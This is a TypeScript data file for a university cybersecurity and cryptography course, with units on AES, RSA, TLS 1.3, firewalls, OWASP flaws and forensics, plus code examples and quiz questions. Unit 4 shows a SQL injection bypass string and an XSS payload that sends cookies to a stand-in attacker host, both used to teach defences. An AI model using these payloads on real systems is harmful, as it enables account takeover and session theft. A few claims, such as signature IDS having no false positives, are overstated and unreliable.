import { Subject } from './types';

export const sem7CyberMaster: Subject = {
  id: "sem7-cyber",
  name: "Cybersecurity & Cryptography",
  code: "CS701",
  color: "bg-red-600",
  icon: "shield",
  description: "Comprehensive University Syllabus for Cybersecurity & Cryptography — Symmetric Ciphers (DES, AES, Cipher Modes CBC/GCM), Asymmetric Public-Key Cryptosystems (RSA, Diffie-Hellman Key Exchange, Elliptic Curve Cryptography ECC), Cryptographic Hash Functions (SHA-256, HMAC), Digital Signatures, PKI, Network Security (SSL/TLS 1.3, IPSec), and Web Application Penetration Testing (OWASP Top 10).",
  semester: 7,
  units: [
    {
      id: "cyber-u1",
      title: "Unit 1: Classical Ciphers & Modern Symmetric Cryptography",
      description: "CIA Triad, Attacks taxonomy, Substitution & Transposition ciphers, Feistel cipher structure, DES, AES-128/192/256 internal rounds, and block cipher operational modes (ECB, CBC, CTR, GCM).",
      topics: [
        {
          id: "cyber-u1-t1",
          title: "CIA Triad, Feistel Cipher Network, AES Round Transformations, and Block Cipher Modes",
          simpleExplanation: "Cybersecurity safeguards computing assets from unauthorized access and tampering. Modern cryptography encrypts plain text into unreadable cipher text using mathematical keys. Symmetric cryptography uses one secret key for both encryption and decryption. The Advanced Encryption Standard (AES) processes 128-bit blocks through multiple rounds of byte substitution, row shifting, column mixing, and round key addition.",
          detailedExplanation: `## 1. The CIA Triad & Threat Model
- **Confidentiality**: Ensuring data is accessible only to authorized entities (achieved via Encryption).
- **Integrity**: Guaranteeing data has not been modified or corrupted in transit (achieved via Hash Functions & MACs).
- **Availability**: Ensuring timely, reliable access to systems for authorized users (mitigated via DDoS defense & redundancy).

---

## 2. Advanced Encryption Standard (AES) Architecture
AES is a non-Feistel Substitution-Permutation Network (SPN) operating on a $4 \times 4$ byte matrix (**State Matrix**).

\`\`\`mermaid
flowchart TD
    PT["128-bit Plaintext"] --> ARK0["Initial AddRoundKey (K0)"]
    ARK0 --> R1["Round 1 to (Nr - 1):\n1. SubBytes (S-Box non-linear substitution)\n2. ShiftRows (Cyclic row permutations)\n3. MixColumns (Matrix multiplication in GF(2^8))\n4. AddRoundKey (XOR with expanded round key)"]
    R1 --> RLAST["Final Round (Nr):\n1. SubBytes\n2. ShiftRows\n3. AddRoundKey (NO MixColumns)"]
    RLAST --> CT["128-bit Ciphertext"]
\`\`\`

| Key Size | Block Size | Number of Rounds ($N_r$) |
| :--- | :--- | :--- |
| **AES-128** | 128 bits | **10 Rounds** |
| **AES-192** | 128 bits | **12 Rounds** |
| **AES-256** | 128 bits | **14 Rounds** |

---

## 3. Block Cipher Modes of Operation
1. **ECB (Electronic Codebook)**: Encrypts each 16-byte block independently with the same key. **Insecure** because identical plaintext blocks produce identical ciphertext blocks (leaks patterns).
2. **CBC (Cipher Block Chaining)**: XORs each plaintext block with the preceding ciphertext block before encryption (uses random Initialization Vector $IV$).
3. **CTR (Counter)**: Encrypts successive counter values and XORs the result with plaintext. Converts block cipher into stream cipher (supports parallel computation).
4. **GCM (Galois/Counter Mode)**: Combines CTR mode with Galois field MAC authentication. Provides **Authenticated Encryption with Associated Data (AEAD)**.`,
          shortNotes: "AES operates on 128-bit blocks using 10, 12, or 14 rounds of SubBytes, ShiftRows, MixColumns, and AddRoundKey. GCM mode is preferred because it provides both confidentiality and data authenticity.",
          examples: [
            {
              title: "AES-256-GCM Authenticated Encryption in Python (Cryptography Library)",
              problem: "Implement AES-256-GCM encryption with a cryptographically secure 96-bit nonce and authentication tag.",
              explanation: "GCM prevents chosen-ciphertext attacks by verifying tag before decrypting payload.",
              code: `import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Generate cryptographically secure random 256-bit key
key = AESGCM.generate_key(bit_length=256)
aesgcm = AESGCM(key)

nonce = os.urandom(12) # 96-bit recommended nonce for GCM
plaintext = b"CampusLoop Secure Student Credential Payload"
aad = b"university=ITM_SLS_BARODA" # Authenticated Additional Data

# Encrypt: produces ciphertext + 16-byte authentication tag
ciphertext = aesgcm.encrypt(nonce, plaintext, aad)
print(f"Encrypted size: {len(ciphertext)} bytes")

# Decrypt and authenticate
decrypted = aesgcm.decrypt(nonce, ciphertext, aad)
assert decrypted == plaintext
print("Decryption and MAC verification successful!")`
            }
          ],
          keyPoints: [
            "ECB mode leaks patterns and should never be used in production.",
            "SubBytes provides non-linear confusion; ShiftRows and MixColumns provide linear diffusion.",
            "MixColumns is omitted in the final round of AES to reduce hardware gate complexity.",
            "AES-GCM is the required cipher suite for modern TLS 1.3 connections."
          ],
          theoryQuestions: [
            {
              question: "Explain the four transformation functions in an AES encryption round with matrix equations.",
              marks: "7 Marks",
              answer: "1. SubBytes: Non-linear byte substitution using 8-bit S-Box derived from multiplicative inverses in GF(2^8). 2. ShiftRows: Left-rotates row 0 by 0, row 1 by 1, row 2 by 2, and row 3 by 3 bytes. 3. MixColumns: Multiplies each column by a fixed polynomial matrix in GF(2^8) modulo (x^4 + 1). 4. AddRoundKey: Bitwise XORs the 128-bit state matrix with the 128-bit round subkey generated from key expansion schedule."
            }
          ],
          mcqs: [
            {
              question: "Why is Electronic Codebook (ECB) mode considered cryptographically insecure?",
              options: [
                "It uses weak 64-bit keys",
                "Identical plaintext blocks produce identical ciphertext blocks",
                "It cannot be decrypted without internet access",
                "It requires prime numbers for block sizes"
              ],
              correctIndex: 1,
              explanation: "Because ECB encrypts each block independently without chaining or IVs, patterns in plaintext remain visible in ciphertext (as demonstrated by the ECB Penguin image)."
            }
          ]
        }
      ]
    },
    {
      id: "cyber-u2",
      title: "Unit 2: Asymmetric Cryptography, Hash Functions & Public Key Infrastructure (PKI)",
      description: "RSA Algorithm, Diffie-Hellman Key Exchange, Man-in-the-Middle attacks, SHA-256, HMAC, Digital Signatures, X.509 Certificates, and TLS 1.3 Handshake.",
      topics: [
        {
          id: "cyber-u2-t1",
          title: "RSA Mathematical Foundations, Diffie-Hellman Exchange, SHA-256 Hash Digest, and TLS 1.3",
          simpleExplanation: "Asymmetric cryptography solves the key-distribution problem by providing each user with a Public Key (freely shared) and a Private Key (kept secret). RSA relies on the mathematical difficulty of factoring large composite semiprimes. Digital signatures ensure non-repudiation and authenticity by encrypting a hash digest with the sender's private key.",
          detailedExplanation: `## 1. The RSA Cryptosystem Mathematical Derivation
1. **Choose two distinct large prime numbers**: $p$ and $q$.
2. **Compute modulus**: $n = p \cdot q$.
3. **Compute Euler's Totient function**: $\phi(n) = (p - 1)(q - 1)$.
4. **Choose public exponent** $e$ such that $1 < e < \phi(n)$ and $\gcd(e, \phi(n)) = 1$ (commonly $65537$).
5. **Compute private key** $d$ using Extended Euclidean Algorithm:
   $$d \equiv e^{-1} \pmod{\phi(n)} \iff e \cdot d \equiv 1 \pmod{\phi(n)}$$
6. **Public Key**: $(e, n)$; **Private Key**: $(d, n)$.
- **Encryption**: $C = M^e \pmod n$.
- **Decryption**: $M = C^d \pmod n$ (guaranteed by Euler's Totient Theorem: $M^{\phi(n)} \equiv 1 \pmod n$).

---

## 2. Diffie-Hellman Key Exchange Flow
Enables two parties (Alice and Bob) to establish a shared secret over an insecure channel:
1. Agree on public prime $p$ and primitive root $g \pmod p$.
2. Alice picks private $a$, sends public $A = g^a \pmod p$.
3. Bob picks private $b$, sends public $B = g^b \pmod p$.
4. Shared secret: $K = B^a \pmod p = (g^b)^a \pmod p = g^{ab} \pmod p = A^b \pmod p$.

---

## 3. TLS 1.3 Accelerated Handshake (1-RTT)
TLS 1.3 deprecates insecure algorithms (MD5, SHA-1, RC4, RSA key exchange) and mandates **Ephemeral Diffie-Hellman (ECDHE)** for Perfect Forward Secrecy (PFS).

\`\`\`mermaid
sequenceDiagram
    participant Client
    participant Server
    Client->>Server: ClientHello (Supported Ciphers + KeyShare ECDHE)
    Server->>Client: ServerHello (Selected Cipher + Server KeyShare)
    Server->>Client: {EncryptedExtensions, Certificate, CertVerify, Finished}
    Note over Client,Server: Handshake complete in 1 Round-Trip Time (1-RTT)!
    Client->>Server: {Finished, Encrypted Application Data}
    Server->>Client: {Encrypted Application Data}
\`\`\``,
          shortNotes: "RSA derives security from prime factorization hardness; Diffie-Hellman enables shared secret derivation via discrete logarithms; TLS 1.3 uses 1-RTT ECDHE for Perfect Forward Secrecy.",
          examples: [
            {
              title: "Step-by-Step RSA Key Generation & Encryption Proof",
              problem: "Given small primes p = 61 and q = 53, compute RSA keys and encrypt message M = 65.",
              explanation: "Demonstrates modular exponentiation and decryption verification.",
              code: `# 1. Modulus and Totient
p, q = 61, 53
n = p * q # 3233
phi = (p - 1) * (q - 1) # 60 * 52 = 3120

# 2. Exponent e (coprime to 3120)
e = 17

# 3. Private key d: (e * d) % phi == 1
# Using Extended Euclidean Algorithm:
d = pow(e, -1, phi) # 2753

print(f"Public Key: (e={e}, n={n})")
print(f"Private Key: (d={d}, n={n})")

# 4. Encrypt M = 65
M = 65
C = pow(M, e, n) # (65^17) % 3233 = 2790
print(f"Ciphertext: {C}")

# 5. Decrypt C = 2790
decrypted_M = pow(C, d, n) # (2790^2753) % 3233 = 65
assert decrypted_M == M
print(f"Decrypted: {decrypted_M}")`
            }
          ],
          keyPoints: [
            "Euler's theorem guarantees that M^(e*d) = M mod n.",
            "Diffie-Hellman without authentication is vulnerable to Man-in-the-Middle (MitM) attacks.",
            "SHA-256 produces a fixed 256-bit digest resistant to preimage, second-preimage, and collision attacks.",
            "Perfect Forward Secrecy (PFS) ensures past session traffic remains secure even if long-term server private keys are later compromised."
          ],
          theoryQuestions: [
            {
              question: "Explain how Digital Signatures provide Non-Repudiation, Integrity, and Authentication.",
              marks: "7 Marks",
              answer: "The sender hashes the message to produce a fixed-size digest, then encrypts the digest with their private key to create the signature. The recipient decrypts the signature using the sender's public key to extract the digest, and compares it to their own re-computed hash of the message. If the hashes match: 1. Integrity is proven (no tampering occurred). 2. Authentication is confirmed (only the sender holds the private key). 3. Non-repudiation is established (the sender cannot deny creating the message)."
            }
          ],
          mcqs: [
            {
              question: "What cryptographic property ensures that a compromise of the server's long-term private key will not compromise past recorded session keys?",
              options: ["Zero-Knowledge Proof", "Perfect Forward Secrecy (PFS)", "Collision Resistance", "Symmetric Padding"],
              correctIndex: 1,
              explanation: "Perfect Forward Secrecy (achieved via Ephemeral Diffie-Hellman ECDHE) generates unique ephemeral keys for each session that are discarded immediately after session termination."
            }
          ]
        }
      ]
    },
    {
      id: "cyber-u3",
      title: "Unit 3: Network Security, Firewalls & Intrusion Detection (IDS/IPS)",
      description: "Network layer attacks (ARP Spoofing, DNS Poisoning, SYN Floods), Stateful Firewalls vs NGFW, Intrusion Detection and Prevention Systems (Signature vs Anomaly IDS), and Transport Layer Security (TLS 1.3 handshake and IPsec).",
      topics: [
        {
          id: "cyber-u3-t1",
          title: "Firewall Architectures, IDS/IPS Systems, and TLS 1.3 / IPsec Protocols",
          simpleExplanation: "A network firewall is the security guard standing at a VIP building's entrance. A simple stateless guard only looks at a visitor's badge (IP address and port) in isolation. A Stateful Firewall remembers conversations: if an internal computer never requested a connection to an outside hacker, the firewall immediately slams the door! An Intrusion Detection System (IDS) is like a smart surveillance camera equipped with alarms: it watches passing packets for suspicious patterns (like malware signatures or sudden traffic spikes). And TLS 1.3 (the HTTPS lock icon in your browser) encrypts all data across the wire so that Wi-Fi eavesdroppers see only random noise.",
          detailedExplanation: `## 1. Firewall Architecture Taxonomy

\`\`\`mermaid
flowchart LR
    Internet["Untrusted Internet"] --> ExtFW["External Firewall"]
    ExtFW --> DMZ["DMZ (Public Web / DNS Servers)"]
    DMZ --> IntFW["Internal Firewall"]
    IntFW --> IntNet["Secure Corporate Intranet & Databases"]
\`\`\`

1. **Stateless Packet Filter**:
   - Inspects packet headers in isolation (Source/Destination IP, Source/Destination Port, Protocol).
   - Fast, but vulnerable to IP spoofing and ACK scanning because it lacks connection memory.
2. **Stateful Packet Inspection (SPI)**:
   - Tracks the state of active network connections in a **State Table** (e.g., TCP 3-way handshake SYN $\\to$ SYN-ACK $\\to$ ESTABLISHED).
   - Only permits incoming packets if they correspond to an established, internally initiated connection or valid state transition.
3. **Application-Level Gateway (Proxy Firewall)**:
   - Operates at Layer 7. Terminates client connections and initiates separate backend connections, performing complete payload protocol inspection (HTTP, FTP).
4. **Next-Generation Firewall (NGFW)**:
   - Integrates Deep Packet Inspection (DPI), TLS decryption, application awareness, and live threat intelligence feeds.

---

## 2. Intrusion Detection (IDS) vs Intrusion Prevention Systems (IPS)

- **IDS (Passive)**: Positioned out-of-band via a network TAP or switch SPAN port. Listens to traffic copies and issues alerts (SIEM alerts) without altering traffic flow.
- **IPS (Inline Active)**: Placed directly in the network traffic path. Analyzes packets in real time and automatically drops malicious packets, resets TCP connections, or updates firewall ACLs.

### Detection Methodologies:
- **Signature-Based (Knowledge-Based)**: Matches packet bytes against a database of known threat patterns (e.g., Snort rules). High accuracy with zero false positives for known attacks, but blind to Zero-Day exploits.
- **Anomaly-Based (Behavior-Based)**: Establishes a baseline of normal network behavior (traffic volumes, protocol ratios). Flags deviations exceeding statistical thresholds. Detects novel zero-days, but incurs higher False Positive rates.

---

## 3. TLS 1.3 Handshake Protocol

TLS 1.3 (RFC 8446) achieves radical performance and security improvements over TLS 1.2:
1. **1-RTT Handshake**: Reduced from 2 Round Trip Times down to 1-RTT (or 0-RTT for resumed sessions).
2. **Mandatory Ephemeral Diffie-Hellman**: Mandates ECDHE key exchange, guaranteeing **Perfect Forward Secrecy (PFS)**.
3. **Deprecations**: Removed RSA key exchange (vulnerable to Bleichenbacher padding attacks), static Diffie-Hellman, CBC-mode ciphers, SHA-1, and MD5.

\`\`\`mermaid
sequenceDiagram
    autonumber
    Client->>Server: ClientHello (Supported Ciphers + Client Key Share g^x)
    Server->>Client: ServerHello (Selected Cipher + Server Key Share g^y) + {EncryptedExtensions, Certificate, CertificateVerify, Finished}
    Note over Client,Server: Client & Server derive Master Secret = KDF(g^xy). Handshake complete in 1-RTT!
    Client->>Server: {Finished} + Encrypted Application Data
\`\`\``,
          shortNotes: "Stateful firewalls track TCP state tables. IDS alerts passively; IPS drops packets inline. Signature IDS catches known threats; Anomaly catches zero-days. TLS 1.3 achieves 1-RTT with mandatory ECDHE forward secrecy.",
          examples: [
            {
              title: "Python Implementation: Stateful Firewall Connection Tracking Table",
              problem: "Simulate a stateful packet filtering firewall verifying TCP handshake state transitions and dropping unsolicited SYN or rogue packets.",
              explanation: "Maintains a state table tracking (src_ip, src_port, dst_ip, dst_port). Rejects unsolicited incoming packets without an outbound ESTABLISHED entry.",
              code: `class StatefulFirewall:
    def __init__(self):
        # State Table: (src_ip, src_port, dst_ip, dst_port) -> state
        self.state_table = {}

    def inspect_packet(self, direction: str, src_ip: str, src_port: int, dst_ip: str, dst_port: int, flags: str) -> bool:
        conn_key_out = (src_ip, src_port, dst_ip, dst_port)
        conn_key_in = (dst_ip, dst_port, src_ip, src_port)

        if direction == "OUTBOUND":
            if flags == "SYN":
                self.state_table[conn_key_out] = "SYN_SENT"
                print(f"[FW-PERMIT] Outbound SYN -> Tracking connection: {conn_key_out}")
                return True
            elif conn_key_out in self.state_table:
                if flags == "ACK" and self.state_table[conn_key_out] == "SYN_RECEIVED":
                    self.state_table[conn_key_out] = "ESTABLISHED"
                    print(f"[FW-PERMIT] Outbound ACK -> Connection ESTABLISHED: {conn_key_out}")
                return True
            elif flags == "ACK":
                print(f"[FW-DROP] Outbound rogue ACK without state table match!")
                return False

        elif direction == "INBOUND":
            # Check if inbound packet matches an existing outbound flow
            if conn_key_in in self.state_table:
                current_state = self.state_table[conn_key_in]
                if flags == "SYN-ACK" and current_state == "SYN_SENT":
                    self.state_table[conn_key_in] = "SYN_RECEIVED"
                    print(f"[FW-PERMIT] Inbound SYN-ACK matching active flow: {conn_key_in}")
                    return True
                elif flags == "DATA" or flags == "ACK":
                    return True
            else:
                # Unsolicited inbound packet
                print(f"[FW-DROP] Inbound unsolicited {flags} from {src_ip}:{src_port} dropped (No state match)!")
                return False

        return False

fw = StatefulFirewall()

# 1. Normal legitimate outbound web request
print("--- Scenario 1: Legitimate Internal Web Browsing ---")
fw.inspect_packet("OUTBOUND", "192.168.1.10", 54321, "93.184.216.34", 443, "SYN")
fw.inspect_packet("INBOUND", "93.184.216.34", 443, "192.168.1.10", 54321, "SYN-ACK")
fw.inspect_packet("OUTBOUND", "192.168.1.10", 54321, "93.184.216.34", 443, "ACK")

# 2. Rogue inbound port scan from internet attacker
print("\\n--- Scenario 2: External Attacker Unsolicited Connection Probe ---")
fw.inspect_packet("INBOUND", "198.51.100.5", 33221, "192.168.1.10", 22, "SYN")`,
              output: `--- Scenario 1: Legitimate Internal Web Browsing ---
[FW-PERMIT] Outbound SYN -> Tracking connection: ('192.168.1.10', 54321, '93.184.216.34', 443)
[FW-PERMIT] Inbound SYN-ACK matching active flow: ('192.168.1.10', 54321, '93.184.216.34', 443)
[FW-PERMIT] Outbound ACK -> Connection ESTABLISHED: ('192.168.1.10', 54321, '93.184.216.34', 443)

--- Scenario 2: External Attacker Unsolicited Connection Probe ---
[FW-DROP] Inbound unsolicited SYN from 198.51.100.5:33221 dropped (No state match)!`
            }
          ],
          keyPoints: [
            "Stateful firewalls maintain connection tracking tables to block unsolicited inbound packets.",
            "Next-Generation Firewalls perform deep packet inspection up to Layer 7 (Application Layer).",
            "Signature IDS detects known patterns with low false positives; Anomaly IDS detects novel zero-days.",
            "TLS 1.3 reduces handshake latency to 1-RTT and eliminates vulnerable ciphers like RSA key exchange.",
            "Ephemeral Diffie-Hellman (ECDHE) guarantees Perfect Forward Secrecy."
          ],
          theoryQuestions: [
            {
              question: "Compare Stateless Packet Filters and Stateful Packet Inspection (SPI) Firewalls with respect to connection tracking, security posture, and resource consumption.",
              marks: "5 Marks",
              answer: "1. Connection Tracking: Stateless packet filters examine each packet in isolation against static rules based on IP/port headers; they have zero memory of previous packets. SPI firewalls maintain a dynamic State Table tracking the lifecycle of transport-layer sessions (TCP handshake flags, sequence numbers, timeouts). 2. Security Posture: Stateless filters are vulnerable to IP spoofing, ACK scans, and port scans because they cannot verify whether an incoming packet belongs to an internally initiated session. SPI firewalls automatically drop any inbound packet that does not match an established outbound entry. 3. Performance & Resources: Stateless filters operate at line speed with minimal memory footprint O(1). SPI firewalls consume CPU and RAM to maintain thousands of state entries and are susceptible to State Table Exhaustion DoS attacks under SYN floods."
            }
          ],
          mcqs: [
            {
              question: "Why was RSA key exchange removed from the official TLS 1.3 protocol specification?",
              options: [
                "RSA key exchange does not provide Perfect Forward Secrecy (PFS)",
                "RSA encryption cannot be executed on 64-bit processors",
                "RSA keys cannot exceed 128 bits in length",
                "RSA requires more than 5 Round Trips"
              ],
              correctIndex: 0,
              explanation: "In RSA key exchange, the pre-master secret is encrypted with the server's static public key. If the server's private key is compromised years later, an adversary can decrypt all historical recorded network traffic, violating Perfect Forward Secrecy."
            }
          ]
        }
      ]
    },
    {
      id: "cyber-u4",
      title: "Unit 4: Web Application Security & OWASP Top 10 Vulnerabilities",
      description: "OWASP Top 10 web vulnerabilities, SQL Injection (In-band, Blind, Time-based), Cross-Site Scripting (Stored, Reflected, DOM-based), Cross-Site Request Forgery (CSRF), and Defense-in-Depth engineering.",
      topics: [
        {
          id: "cyber-u4-t1",
          title: "OWASP Top 10, SQL Injection Defense, Cross-Site Scripting (XSS), and CSRF Mitigation",
          simpleExplanation: "Even if your network firewall and operating system are 100% secure, a single bug in your web app code can let an attacker take over everything. In SQL Injection, an attacker types database commands into a login box (like `' OR '1'='1`), tricking the server into running their SQL code. In Cross-Site Scripting (XSS), the attacker injects malicious JavaScript into comments that other innocent users view, stealing their session cookies. In Cross-Site Request Forgery (CSRF), a malicious site tricks your logged-in browser into sending unauthorized requests (like 'transfer $1,000 to hacker'). We fix SQL Injection with Prepared Statements (separating code from data), XSS with HTML escaping, and CSRF with SameSite cookie flags and secret anti-CSRF tokens.",
          detailedExplanation: `## 1. OWASP Top 10 Web Application Vulnerabilities

The Open Web Application Security Project (OWASP) ranks the most critical security risks:
1. **A01: Broken Access Control**: Users acting outside their intended permissions (e.g., IDOR - accessing \`/api/user/101\` when logged in as user 102).
2. **A02: Cryptographic Failures**: Storing passwords in plaintext or MD5, using weak TLS configurations.
3. **A03: Injection**: Untrusted user input interpreted as execution commands (SQL, OS command, LDAP).
4. **A07: Identification and Authentication Failures**: Brute-force vulnerabilities, weak password policies, session fixation.
5. **A10: Server-Side Request Forgery (SSRF)**: Tricking the server into fetching an internal resource (e.g., AWS EC2 metadata \`http://169.254.169.254\`).

---

## 2. SQL Injection Taxonomy & Parameterized Query Defense

- **In-Band SQLi**: Attacker receives direct query results in HTTP response (Classic, UNION-based).
- **Inferential (Blind) SQLi**: No data returned on page; attacker infers database structure through boolean true/false conditions or time delays (\`pg_sleep(5)\`).

### Root Cause: Mixing SQL Code with Untrusted Data Strings
\`\`\`sql
-- Vulnerable Dynamic String Concatenation:
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
\`\`\`

### Definitive Remediation: Parameterized Queries (Prepared Statements)
When using Prepared Statements, the database driver compiles the SQL statement **prior** to binding parameters. User input is strictly treated as literal data strings, preventing any alteration of query AST syntax:
\`\`\`sql
-- Pre-compiled template:
SELECT * FROM users WHERE username = ? AND password_hash = ?;
\`\`\`

---

## 3. Cross-Site Scripting (XSS) & CSRF Defenses

\`\`\`mermaid
flowchart TD
    subgraph XSS["Cross-Site Scripting (Attacker injects JS into victim's browser)"]
        Stored["Stored XSS (Persistent in DB)"]
        Reflected["Reflected XSS (Echoed via URL parameter)"]
        DOM["DOM-based XSS (Client-side JS sinks: innerHTML)"]
    end
    subgraph Defenses["Engineered Defenses"]
        ContextEscaping["Context-Aware Output Encoding (HTML Escape)"]
        CSP["Content Security Policy (script-src 'self')"]
        HttpOnly["HttpOnly Cookie Flag (Blocks JS document.cookie)"]
        SameSite["SameSite=Strict/Lax Cookie Flag (Blocks CSRF)"]
        AntiCSRF["Anti-CSRF Synchronizer Tokens"]
    end
\`\`\`

- **CSRF Defense**:
  1. **Anti-CSRF Tokens**: Cryptographically random, per-session tokens embedded in forms and verified server-side.
  2. **SameSite Cookies**: \`SameSite=Lax\` or \`Strict\` prevents browsers from attaching session cookies to cross-origin POST requests.`,
          shortNotes: "OWASP A01 = Broken Access Control. Fix SQLi with parameterized prepared statements. XSS types: Stored, Reflected, DOM; fix with HTML escaping and CSP. CSRF fix: Anti-CSRF tokens and SameSite cookies.",
          examples: [
            {
              title: "Python Implementation: SQL Injection Vulnerability vs Parameterized Defense",
              problem: "Demonstrate SQL Injection authentication bypass using an in-memory SQLite database, followed by parameterized query neutralization and XSS sanitization.",
              explanation: "Shows how string concatenation allows authentication bypass (' OR '1'='1), whereas parameterized queries treat the payload as harmless literal characters.",
              code: `import sqlite3
import html

# Set up in-memory test database
conn = sqlite3.connect(":memory:")
cursor = conn.cursor()
cursor.execute("CREATE TABLE accounts (id INTEGER PRIMARY KEY, username TEXT, role TEXT)")
cursor.execute("INSERT INTO accounts VALUES (1, 'admin', 'SuperAdmin')")
cursor.execute("INSERT INTO accounts VALUES (2, 'student', 'User')")
conn.commit()

# Malicious user input
malicious_payload = "' OR '1'='1"

# 1. VULNERABLE: Dynamic String Concatenation
vuln_query = f"SELECT id, username, role FROM accounts WHERE username = '{malicious_payload}'"
cursor.execute(vuln_query)
leaked_records = cursor.fetchall()
print(f"[VULNERABLE QUERY] Rows returned: {len(leaked_records)} (Authentication Bypassed!)")
for row in leaked_records:
    print(" - Compromised Account:", row)

# 2. SECURE: Parameterized Query (Prepared Statement)
secure_query = "SELECT id, username, role FROM accounts WHERE username = ?"
cursor.execute(secure_query, (malicious_payload,))
safe_records = cursor.fetchall()
print(f"\\n[SECURE QUERY] Rows returned: {len(safe_records)} (Attack Neutralized!)")

# 3. XSS Defense via Context-Aware HTML Escaping
dirty_xss = "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>"
clean_html = html.escape(dirty_xss)
print(f"\\nSanitized XSS Output: {clean_html}")`,
              output: `[VULNERABLE QUERY] Rows returned: 2 (Authentication Bypassed!)
 - Compromised Account: (1, 'admin', 'SuperAdmin')
 - Compromised Account: (2, 'student', 'User')

[SECURE QUERY] Rows returned: 0 (Attack Neutralized!)

Sanitized XSS Output: &lt;script&gt;fetch('http://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;`
            }
          ],
          keyPoints: [
            "OWASP Top 10 identifies Broken Access Control and Injection as leading web application risks.",
            "Prepared statements compile SQL commands separately, preventing injection payload interpretation.",
            "Cross-Site Scripting (XSS) executes malicious scripts in the victim's authenticated browser context.",
            "The HttpOnly cookie flag prevents client-side JavaScript from accessing session cookies via document.cookie.",
            "Cross-Site Request Forgery (CSRF) is mitigated using cryptographically signed anti-CSRF tokens."
          ],
          theoryQuestions: [
            {
              question: "Explain the anatomy of SQL Injection. Why does client-side input validation fail to protect against SQL Injection attacks?",
              marks: "5 Marks",
              answer: "SQL Injection occurs when untrusted user data is concatenated directly into SQL command strings. An attacker supplies special characters (like quotes, comments --, or boolean expressions OR 1=1) that alter the logical syntax tree of the database query. Client-side input validation (e.g. JavaScript in HTML forms) offers zero real protection because attackers completely bypass the browser frontend by transmitting raw HTTP POST/GET requests directly using cURL, Postman, or automated scripts. True security requires server-side parameterization (Prepared Statements) where the database engine compiles the SQL command structure in advance."
            }
          ],
          mcqs: [
            {
              question: "Which HTTP cookie attribute specifically prevents malicious XSS scripts from stealing user session tokens via 'document.cookie'?",
              options: ["HttpOnly", "SameSite", "Secure", "Domain"],
              correctIndex: 0,
              explanation: "The HttpOnly flag instructs the browser that the cookie must never be accessible via client-side Document Object Model APIs (such as document.cookie), effectively neutralizing cookie theft via XSS."
            }
          ]
        }
      ]
    },
    {
      id: "cyber-u5",
      title: "Unit 5: Digital Forensics, Incident Response & Ethical Hacking",
      description: "Digital forensics evidence acquisition (RFC 3227 Order of Volatility, Chain of Custody), NIST Incident Response lifecycle, and Ethical Hacking methodologies (OSINT, Nmap, Metasploit, Privilege Escalation).",
      topics: [
        {
          id: "cyber-u5-t1",
          title: "Forensics Volatility, NIST Incident Response Lifecycle, and Penetration Testing",
          simpleExplanation: "When a crime is committed in the physical world, police tape off the scene, dust for fingerprints, and protect the evidence in sealed bags. In cyber forensics, the golden rule is the 'Order of Volatility': grab the most perishable evidence first! CPU registers and RAM memory vanish the moment you pull the power cord, so you must dump RAM before touching hard drives. Incident Response is the emergency playbook (like firefighters responding to a blaze): Prepare, Detect, Contain, Eradicate, and Recover. Finally, Ethical Hackers (White Hats) use the exact same tools and techniques as malicious attackers—port scanning, vulnerability exploitation, privilege escalation—with permission, to find and seal security holes before bad actors exploit them.",
          detailedExplanation: `## 1. Digital Forensics Order of Volatility (RFC 3227)

When seizing digital evidence from a compromised system, evidence must be collected in order of highest to lowest volatility:
1. **CPU Registers and Cache Memory** (Lifespan: nanoseconds)
2. **Routing Tables, ARP Cache, Process Table, Kernel Statistics, Physical RAM** (Lifespan: milliseconds to minutes; lost upon power down)
3. **Temporary Filesystems & Swap Space / Pagefile**
4. **Non-Volatile Hard Disks (SSD / HDD storage)**
5. **Remote Logging Data & Network Topologies**
6. **Archival Backup Media & Tapes**

### Chain of Custody & Forensic Imaging:
- **Bit-Stream Disk Image**: Forensics investigators never examine the original disk. They create a physical bit-by-bit clone using a hardware **Write Blocker**.
- **Cryptographic Hash Verification**: Compute SHA-256 hash of original disk and clone before and after investigation; identical hashes prove evidence was never altered.

---

## 2. NIST SP 800-61 Incident Response Lifecycle

\`\`\`mermaid
flowchart TD
    Prep["1. Preparation (Tools, Training, Policies, SIEM)"] --> Det["2. Detection & Analysis (Alerts, Triaging, IOCs)"]
    Det --> Cont["3. Containment (Isolate Network, Quoting)"]
    Cont --> Erad["4. Eradication (Remove Malware, Patch Holes)"]
    Erad --> Rec["5. Recovery (Restore from Clean Backups, Monitor)"]
    Rec --> Lessons["6. Post-Incident Activity (Lessons Learned RCA)"]
    Lessons -.-> Prep
\`\`\`

- **Indicators of Compromise (IoCs)**: File hashes, malicious IP addresses, domain names, unusual outbound beaconing.
- **Containment Strategies**: Short-term containment (isolating machine from VLAN, revoking compromised API keys) vs Long-term containment.

---

## 3. Ethical Hacking & Penetration Testing Methodology

Follows the PTES (Penetration Testing Execution Standard) framework:
1. **Reconnaissance (Information Gathering)**:
   - Passive: OSINT (Open Source Intelligence), Whois, Shodan, Google Dorking.
   - Active: DNS zone transfers, ping sweeps.
2. **Scanning & Enumeration**:
   - Port scanning via Nmap (SYN Stealth Scan \`-sS\`, Version Detection \`-sV\`, Scripting Engine NSE).
   - Service banner grabbing and vulnerability identification.
3. **Exploitation**:
   - Leveraging verified exploits (e.g., Metasploit framework) against discovered service vulnerabilities.
4. **Post-Exploitation & Privilege Escalation**:
   - Vertical privilege escalation (User $\\to$ Root/SYSTEM via kernel exploits, SUID binaries, misconfigured sudoers).
   - Horizontal privilege escalation (pivoting across internal subnets).`,
          shortNotes: "RFC 3227 Volatility: Registers/RAM > Temp/Swap > Disk > Backups. Use write blockers and SHA-256 for chain of custody. NIST IR: Prepare -> Detect -> Contain -> Eradicate -> Recover -> Lessons. Nmap -sS for stealth SYN scans.",
          examples: [
            {
              title: "Python Implementation: Forensic Evidence Hasher & Order of Volatility Logger",
              problem: "Implement a digital forensics evidence integrity tool calculating SHA-256 bit-stream hashes and documenting RFC 3227 acquisition records.",
              explanation: "Hashes binary file chunks in 64KB increments to prevent memory exhaustion and generates chain of custody metadata.",
              code: `import hashlib
import time

def generate_evidence_record(evidence_name: str, raw_bytes: bytes, investigator: str):
    # Calculate SHA-256 cryptographic checksum
    hasher = hashlib.sha256()
    hasher.update(raw_bytes)
    evidence_hash = hasher.hexdigest()

    record = {
        "Evidence ID": f"EV-{int(time.time())}",
